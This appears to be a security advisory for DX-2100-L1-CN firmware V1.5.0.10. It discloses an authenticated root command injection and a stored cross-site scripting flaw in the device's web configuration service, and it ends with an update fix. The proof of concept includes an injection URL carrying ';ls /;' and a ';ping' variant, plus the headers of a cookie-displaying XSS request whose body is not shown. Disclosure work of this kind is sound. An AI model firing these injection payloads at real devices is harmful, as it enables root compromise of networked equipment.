Vulnerable versions
-------------------------------------------------------------------------------
DX-2100-L1-CN / V1.5.0.10
Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Command Injection
An authenticated command injection has been identified in the web
configuration
service of the device. It can be used to execute system commands on the
OS from
the device in the context of the user "root". Therefore, a full
compromization
of the device is possible by having credentials for the web service only.
2) Stored Cross-Site Scripting
A stored cross-site scripting vulnerability has been identified in the
function
"net diagnosis" on the device's web configuration service. This can be
exploited in the context of a victim's session.
Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Command Injection
The parameter "diagnose\_address" contains the payload ";ls /;", which
basically
prints the content of the root directory to the serial terminal of the
device.
http://192.168.3.150/lform/net\_diagnose?action=diagnose&diagnose\_type=0&diagnose\_address=;ls%20/;
The output can be seen in the context of a virtualized firmware clone,
as used
to find this vulnerability, but is usually invisible to a customer.
Therefore,
a more visible payload may be commands that interact via the network, like
";ping 192.168.0.10;". This command will ping a device on the
corresponding IP
address within the local network.
2) Stored Cross-Site Scripting
The following code prints the current cached cookies of a user's session
to the
screen. The JavaScript code will be stored on the device permanently.
===============================================================================
POST /lform/urlfilter?action=save HTTP/1.1
Host: 192.168.3.150
Accept: \*/\*
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 190
Connection: keep-alive
Cookie: language=en\_US; userindex=1; loginexpire=1648630746607; session=30

===============================================================================
The vulnerabilities were manually verified on an emulated device by
using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).
Solution
-------------------------------------------------------------------------------
Update to firmware version V1.5.0.12.
Workaround
-------------------------------------------------------------------------------
None
Recommendation
